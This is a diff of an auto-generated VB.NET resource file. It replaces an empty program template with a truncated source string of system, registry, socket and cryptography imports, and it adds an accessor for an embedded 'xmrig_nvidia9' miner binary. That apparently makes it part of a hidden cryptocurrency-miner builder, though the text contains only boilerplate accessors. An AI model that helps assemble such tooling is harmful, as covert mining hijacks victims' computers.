@@ -71,14 +71,27 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized string similar to Public Class Program
+        '''  Looks up a localized string similar to 
         '''
-        '''    Public Shared Sub Main()
-        '''
-        '''    End Sub
-        '''
-        '''End Class
-        '''.
+        '''Imports System.Security.Cryptography
+        '''Imports Microsoft.Win32
+        '''Imports System.Management
+        '''Imports System
+        '''Imports System.Net.Sockets
+        '''Imports Microsoft.VisualBasic
+        '''Imports System.Diagnostics
+        '''Imports System.Reflection
+        '''Imports System.Runtime.InteropServices
+        '''Imports System.Collections.Generic
+        '''Imports System.Drawing
+        '''Imports System.Windows.Forms
+        '''Imports System.IO
+        '''Imports System.Net
+        '''Imports System.Drawing.Drawing2D
+        '''Imports System.Drawing.Imaging
+        '''Imports System.Threading
+        '''Imports System.Security
+        '''Im [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
@@ -122,6 +135,16 @@ Namespace My.Resources
         Friend ReadOnly Property xmrig_nvidia() As Byte()
             Get
                 Dim obj As Object = ResourceManager.GetObject("xmrig_nvidia", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property xmrig_nvidia9() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("xmrig_nvidia9", resourceCulture)
                 Return CType(obj,Byte())
             End Get
         End Property
